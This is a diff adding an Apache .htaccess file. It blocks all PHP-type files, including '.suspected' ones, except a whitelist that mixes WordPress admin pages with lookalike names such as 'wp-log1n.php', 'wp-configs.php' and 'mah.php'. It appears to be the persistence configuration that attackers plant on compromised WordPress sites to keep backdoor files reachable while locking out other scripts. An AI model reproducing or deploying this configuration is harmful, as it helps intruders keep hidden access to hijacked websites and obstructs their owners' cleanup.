@@ -1,0 +1,17 @@
+DirectoryIndex index.php index.html
+<FilesMatch '.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Deny from all
+</FilesMatch>
+<FilesMatch '^(goods.php|buy.php|special.php|click.php|edit.php|pages.php|product.php|shop.php|item.php|search.php|brand.php|wp-configs.php|install.php|plugin.php|plugins.php|admin.php|index.php|wp-login.php|wp-log1n.php|about.php|defaults.php|function.php|mah.php|networks.php|options.php|amp.php|load-styles.php|load-scripts.php|themes.php|wp-admin.php|post-new.php|edit-tags.php|upload.php|media-new.php|edit-comments.php|site-editor.php|plugin-install.php|users.php|user-new.php|profile.php|tools.php|import.php|export.php|site-health.php|theme-editor.php|plugin-editor.php|options-general.php|options-writing.php|options-reading.php|options-discussion.php|options-media.php|options-permalink.php|options-privacy.php|update-core.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
